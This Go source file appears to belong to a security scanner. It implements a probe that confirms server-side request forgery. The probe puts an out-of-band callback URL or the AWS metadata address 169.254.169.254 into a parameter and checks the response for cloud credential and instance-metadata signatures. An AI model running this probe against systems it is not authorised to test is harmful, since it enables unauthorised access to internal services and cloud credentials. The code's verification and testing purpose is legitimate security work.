package verify

import (
	"net/http"
	"strings"
)

// ssrfInternalSignatures prove (when reflected in the body) the server fetched
// an internal/metadata target — reflected SSRF.
var ssrfInternalSignatures = []string{
	"iam/security-credentials", "ami-id", "instance-id", // AWS IMDS
	"computeMetadata", // GCP
	"INTERNAL-SECRET", // generic marker for local test fixtures
}

// SSRFProbe verifies server-side request forgery.
//
// Plan: point the suspect param at an attacker URL — prefer the out-of-band
// callback (catches BLIND SSRF), else a cloud-metadata URL we can fingerprint
// (REFLECTED SSRF).
// Execute: fire once; confirmed if the OOB listener was hit with our nonce, or
// an internal signature is reflected; otherwise refuted.
type SSRFProbe struct{}

func (SSRFProbe) Kind() string { return "ssrf" }

func (SSRFProbe) attackURL(oob string) (value, nonce string) {
	if oob != "" {
		nonce = "/ssrf-" + newNonce()
		return oob + nonce, nonce
	}
	return "http://169.254.169.254/latest/meta-data/", ""
}

func (p SSRFProbe) Plan(f Finding, oob string) Plan {
	value, _ := p.attackURL(oob)
	u, _ := buildURL(f, f.Param, value)
	return Plan{Summary: methodOf(f) + " " + u + "   [" + f.Param + " = " + value + "]"}
}

func (p SSRFProbe) Execute(f Finding, env *Env) Result {
	r := Result{}
	value, nonce := p.attackURL(env.OOB.URL())
	u, err := buildURL(f, f.Param, value)
	if err != nil {
		r.Evidence = "build url: " + err.Error()
		return r
	}
	req, err := http.NewRequest(methodOf(f), u, nil)
	if err != nil {
		r.Evidence = "build request: " + err.Error()
		return r
	}
	applyHeaders(req, f)

	_, body, err := env.do(req)
	if err != nil {
		r.Evidence = "request error (inconclusive): " + err.Error()
		return r
	}

	// (1) Blind: target called our OOB listener with the smuggled nonce.
	if nonce != "" && env.OOB.anyHitPrefix("/ssrf-") {
		r.Confirmed = true
		r.Evidence = "out-of-band: target fetched our listener — blind SSRF confirmed"
		return r
	}
	// (2) Reflected: internal/metadata signature echoed back.
	low := strings.ToLower(body)
	for _, sig := range ssrfInternalSignatures {
		if strings.Contains(low, strings.ToLower(sig)) {
			r.Confirmed = true
			r.Evidence = "reflected: response contains internal signature " + sig
			return r
		}
	}
	r.Refuted = true
	r.Evidence = "no OOB callback and no internal signature reflected"
	return r
}

func init() { Register(SSRFProbe{}) }
